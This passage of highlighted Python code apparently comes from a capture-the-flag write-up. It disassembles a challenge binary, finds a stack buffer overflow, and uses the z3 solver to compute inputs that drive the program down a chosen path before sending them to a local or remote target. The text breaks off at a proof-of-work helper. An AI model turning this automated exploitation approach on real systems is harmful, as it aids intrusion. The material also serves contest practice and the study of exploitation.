class="line">            args=args,</span><br><span class="line"></span><br><span class="line">            exits=[],</span><br><span class="line"></span><br><span class="line">            choice=<span class="literal">None</span>,</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        target = args[<span class="number">0</span>].split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="string">&#x27;jmp&#x27;</span>:</span><br><span class="line"></span><br><span class="line">            ins.exits.append(target)</span><br><span class="line"></span><br><span class="line">            reverse_map.setdefault(target, [])</span><br><span class="line"></span><br><span class="line">            reverse_map[target].append(addr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> opcode <span class="keyword">in</span> [<span class="string">&#x27;je&#x27;</span>, <span class="string">&#x27;jne&#x27;</span>, <span class="string">&#x27;jg&#x27;</span>, <span class="string">&#x27;jbe&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">            ins.exits.append(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">            ins.exits.append(target)</span><br><span class="line"></span><br><span class="line">            reverse_map.setdefault(target, [])</span><br><span class="line"></span><br><span class="line">            reverse_map[target].append(addr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            ins.exits.append(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> opcode.startswith(<span class="string">&#x27;j&#x27;</span>):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;unhandled jmp: %s&#x27;</span> % opcode)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(instructions) <span class="keyword">and</span> instructions[-<span class="number">1</span>].exits[<span class="number">0</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">            instructions[-<span class="number">1</span>].exits[<span class="number">0</span>] = addr</span><br><span class="line"></span><br><span class="line">            reverse_map.setdefault(addr, [])</span><br><span class="line"></span><br><span class="line">            reverse_map[addr].append(instructions[-<span class="number">1</span>].addr)</span><br><span class="line"></span><br><span class="line">        instructions.append(ins)</span><br><span class="line"></span><br><span class="line">        mapping[addr] = ins</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> instructions:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(ins)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> instructions, mapping, reverse_map</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_overflow</span>():</span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\[rbp-(\w+)\]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, ins <span class="keyword">in</span> <span class="built_in">enumerate</span>(instructions):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ins.opcode == <span class="string">&#x27;call&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;input_line&#x27;</span> <span class="keyword">in</span> ins.args[<span class="number">0</span>]:</span><br><span class="line"></span><br><span class="line">            lea_rax_rbp = instructions[i-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> lea_rax_rbp.opcode == <span class="string">&#x27;lea&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> lea_rax_rbp.args[<span class="number">0</span>] == <span class="string">&#x27;rax&#x27;</span></span><br><span class="line"></span><br><span class="line">            mo = pattern.<span class="keyword">match</span>(lea_rax_rbp.args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> mo:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;opcode incorrect: %s&#x27;</span> % lea_rax_rbp.args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            offset = <span class="built_in">int</span>(mo.group(<span class="number">1</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            mov_esi = instructions[i-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> mov_esi.opcode == <span class="string">&#x27;mov&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> mov_esi.args[<span class="number">0</span>] == <span class="string">&#x27;esi&#x27;</span></span><br><span class="line"></span><br><span class="line">            length = <span class="built_in">int</span>(mov_esi.args[<span class="number">1</span>], <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> length - offset &gt;= <span class="number">8</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> i, offset, length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">idx</span>):</span><br><span class="line"></span><br><span class="line">    addr = instructions[idx].addr</span><br><span class="line"></span><br><span class="line">    path = [addr]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        prev = reverse_map[addr]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(prev) &gt; <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;multiple path: %s&#x27;</span> % prev)</span><br><span class="line"></span><br><span class="line">        prev = prev[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        mapping[prev].choice = addr</span><br><span class="line"></span><br><span class="line">        addr = prev</span><br><span class="line"></span><br><span class="line">        path.append(addr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mapping[addr].index == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> path[::-<span class="number">1</span>]:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">symbols, operand:<span class="built_in">str</span>, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> BitVecVal(<span class="built_in">int</span>(operand, <span class="number">0</span>), size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> symbols[operand]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">symbols:<span class="built_in">dict</span>, operand:<span class="built_in">str</span>, value</span>):</span><br><span class="line"></span><br><span class="line">    symbols[operand] = value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    a = parse(symbols, args[<span class="number">0</span>], size=size)</span><br><span class="line"></span><br><span class="line">    b = parse(symbols, args[<span class="number">1</span>], size=size)</span><br><span class="line"></span><br><span class="line">    c = a + b</span><br><span class="line"></span><br><span class="line">    store(symbols, args[<span class="number">0</span>], c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    a = parse(symbols, args[<span class="number">0</span>], size=size)</span><br><span class="line"></span><br><span class="line">    b = parse(symbols, args[<span class="number">1</span>], size=size)</span><br><span class="line"></span><br><span class="line">    c = a - b</span><br><span class="line"></span><br><span class="line">    store(symbols, args[<span class="number">0</span>], c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    a = parse(symbols, args[<span class="number">0</span>], size=size)</span><br><span class="line"></span><br><span class="line">    b = parse(symbols, args[<span class="number">1</span>], size=size)</span><br><span class="line"></span><br><span class="line">    c = a * b</span><br><span class="line"></span><br><span class="line">    store(symbols, args[<span class="number">0</span>], c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    a = parse(symbols, args[<span class="number">0</span>], size=size)</span><br><span class="line"></span><br><span class="line">    b = parse(symbols, args[<span class="number">1</span>], size=size)</span><br><span class="line"></span><br><span class="line">    c = a ^ b</span><br><span class="line"></span><br><span class="line">    store(symbols, args[<span class="number">0</span>], c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    b = parse(symbols, args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    store(symbols, args[<span class="number">0</span>], b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitwise_not</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    a = parse(symbols, args[<span class="number">0</span>], size=size)</span><br><span class="line"></span><br><span class="line">    c = ~a</span><br><span class="line"></span><br><span class="line">    store(symbols, args[<span class="number">0</span>], c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">solver, symbols, args, size=<span class="number">32</span></span>):</span><br><span class="line"></span><br><span class="line">    a = parse(symbols, args[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    b = parse(symbols, args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    solver.add(a == b)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_math</span>(<span class="params">block, <span class="keyword">match</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;solve_math&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>, b)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># DWORD PTR [rbp-0x5e0]</span></span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;DWORD PTR \[rbp-(\w+)\]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line"></span><br><span class="line">    symbols = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    user_input = []</span><br><span class="line"></span><br><span class="line">    ops = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;mov&#x27;</span>: mov,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;add&#x27;</span>: add,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;sub&#x27;</span>: sub,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;cmp&#x27;</span>: cmp,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;xor&#x27;</span>: xor,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;imul&#x27;</span>: imul,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(block):</span><br><span class="line"></span><br><span class="line">        ins = block[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ins.opcode == <span class="string">&#x27;call&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;input_val&#x27;</span> <span class="keyword">in</span> ins.args[<span class="number">0</span>]:</span><br><span class="line"></span><br><span class="line">            store_ins = block[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> store_ins.opcode == <span class="string">&#x27;mov&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> store_ins.args[<span class="number">1</span>] == <span class="string">&#x27;eax&#x27;</span></span><br><span class="line"></span><br><span class="line">            mo = pattern.<span class="keyword">match</span>(store_ins.args[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> mo:</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(store_ins)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;not match&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                bv = BitVec(store_ins.args[<span class="number">0</span>], <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">                user_input.append(bv)</span><br><span class="line"></span><br><span class="line">                symbols[store_ins.args[<span class="number">0</span>]] = bv</span><br><span class="line"></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(user_input):</span><br><span class="line"></span><br><span class="line">                ops[ins.opcode](solver, symbols, ins.args, size=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [random.randint(<span class="number">0</span>, <span class="number">65535</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_input))]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line"></span><br><span class="line">        m = solver.model()</span><br><span class="line"></span><br><span class="line">        ret = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_input)):</span><br><span class="line"></span><br><span class="line">            v = m[user_input[i]]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> v <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">                ret.append(v.as_long())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                ret.append(<span class="number">0x5f</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;unsat&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_array</span>(<span class="params">block, <span class="keyword">match</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;solve_array&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>, b)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line"></span><br><span class="line">    symbols = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    pattern  = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\[rbp-(\w+)\]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\[rip\+(\w+)\]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    user_input = []</span><br><span class="line"></span><br><span class="line">    ops = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;movzx&#x27;</span>: mov,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;mov&#x27;</span>: mov,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;add&#x27;</span>: add,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;sub&#x27;</span>: sub,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;cmp&#x27;</span>: cmp,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;xor&#x27;</span>: xor,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;not&#x27;</span>: bitwise_not,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(block):</span><br><span class="line"></span><br><span class="line">        ins = block[i]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(i, ins)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ins.opcode == <span class="string">&#x27;call&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;input_line&#x27;</span> <span class="keyword">in</span> ins.args[<span class="number">0</span>]:</span><br><span class="line"></span><br><span class="line">            mov_esi = block[i-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> mov_esi.opcode == <span class="string">&#x27;mov&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> mov_esi.args[<span class="number">0</span>] == <span class="string">&#x27;esi&#x27;</span></span><br><span class="line"></span><br><span class="line">            length = <span class="built_in">int</span>(mov_esi.args[<span class="number">1</span>], <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            lea_ins = block[i-<span class="number">3</span>]    <span class="comment"># lea    rax,[rbp-0x6e0]</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> lea_ins.opcode == <span class="string">&#x27;lea&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> lea_ins.args[<span class="number">0</span>] == <span class="string">&#x27;rax&#x27;</span></span><br><span class="line"></span><br><span class="line">            mo = pattern.search(lea_ins.args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> mo:</span><br><span class="line"></span><br><span class="line">                base = <span class="built_in">int</span>(mo.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;invalid option: %s&#x27;</span> % lea_ins.args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;length = %#x&#x27;</span> % length)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"></span><br><span class="line">                key = <span class="string">&#x27;BYTE PTR [rbp-%#x]&#x27;</span> % (base-j)</span><br><span class="line"></span><br><span class="line">                bv = BitVec(key, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">                symbols[key] = bv</span><br><span class="line"></span><br><span class="line">                user_input.append(bv)</span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(user_input):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;lea&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;setz&#x27;</span>, <span class="string">&#x27;sete&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> ins.opcode == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                    lea_rsi = block[i-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">assert</span> lea_rsi.opcode == <span class="string">&#x27;lea&#x27;</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">assert</span> lea_rsi.args[<span class="number">0</span>] == <span class="string">&#x27;rsi&#x27;</span></span><br><span class="line"></span><br><span class="line">                    mo = pattern2.<span class="keyword">match</span>(lea_rsi.args[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> mo:</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;invalid lea_rsi: %s&#x27;</span> % lea_rsi)</span><br><span class="line"></span><br><span class="line">                    pos = <span class="built_in">int</span>(mo.group(<span class="number">1</span>), <span class="number">0</span>) + <span class="built_in">int</span>(lea_rsi.choice, <span class="number">16</span>) - <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">                    value = bin_content[pos:pos+length]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"></span><br><span class="line">                        key = <span class="string">&#x27;BYTE PTR [rbp-%#x]&#x27;</span> % (base-j)</span><br><span class="line"></span><br><span class="line">                        solver.add(symbols[key] == BitVecVal(value[j], <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> ins.opcode == <span class="string">&#x27;mov&#x27;</span> <span class="keyword">and</span> ins.args[<span class="number">1</span>] == <span class="string">&#x27;rax&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(ins.args) &gt; <span class="number">1</span> <span class="keyword">and</span> ins.args[<span class="number">1</span>] == <span class="string">&#x27;al&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                        args = [ins.args[<span class="number">0</span>], <span class="string">&#x27;eax&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                        args = ins.args</span><br><span class="line"></span><br><span class="line">                    ops[ins.opcode](solver, symbols, args, size=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([random.randint(<span class="number">65</span>, <span class="number">90</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_input))])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line"></span><br><span class="line">        m = solver.model()</span><br><span class="line"></span><br><span class="line">        ret = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_input)):</span><br><span class="line"></span><br><span class="line">            ret.append(m[user_input[i]].as_long())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;unsat&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">walk</span>(<span class="params">io</span>):</span><br><span class="line"></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    addr = instructions[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line">    block = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        ins = mapping[addr]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ins.exits) == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ins.choice != ins.exits[<span class="number">0</span>]:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            block.append(ins)</span><br><span class="line"></span><br><span class="line">            addr = ins.choice</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;handling block with %d instructions&#x27;</span> % (<span class="built_in">len</span>(block), ))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> ins.choice <span class="keyword">in</span> ins.exits</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> block[-<span class="number">1</span>].opcode == <span class="string">&#x27;cmp&#x27;</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># math</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ins.choice <span class="keyword">in</span> ins.args[<span class="number">0</span>]:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;je&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(ins)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">assert</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;jne&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;je&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">assert</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;jne&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            ret = solve_math(block, should_match)</span><br><span class="line"></span><br><span class="line">            v = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ret])</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;solve math:&#x27;</span>, v)</span><br><span class="line"></span><br><span class="line">            io.read_until(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            io.write(v + <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> block[-<span class="number">1</span>].opcode == <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ins.choice <span class="keyword">in</span> ins.args[<span class="number">0</span>]:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;je&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">assert</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;jne&#x27;</span>], ins.opcode</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;je&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">assert</span> ins.opcode <span class="keyword">in</span> [<span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;jne&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                    should_match = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            ret = solve_array(block, should_match)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;solve array:&#x27;</span>, ret)</span><br><span class="line"></span><br><span class="line">            io.read_until(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            io.write(ret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(block[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;not possible&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;next block entry: %s&#x27;</span> % ins.choice)</span><br><span class="line"></span><br><span class="line">        block = []</span><br><span class="line"></span><br><span class="line">        addr = ins.choice</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;./bin.patched&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.getenv(<span class="string">&#x27;TARGET&#x27;</span>):</span><br><span class="line"></span><br><span class="line">    ary = os.getenv(<span class="string">&#x27;TARGET&#x27;</span>).split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    target = (ary[<span class="number">0</span>], <span class="built_in">int</span>(ary[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">suffix, hsh</span>):</span><br><span 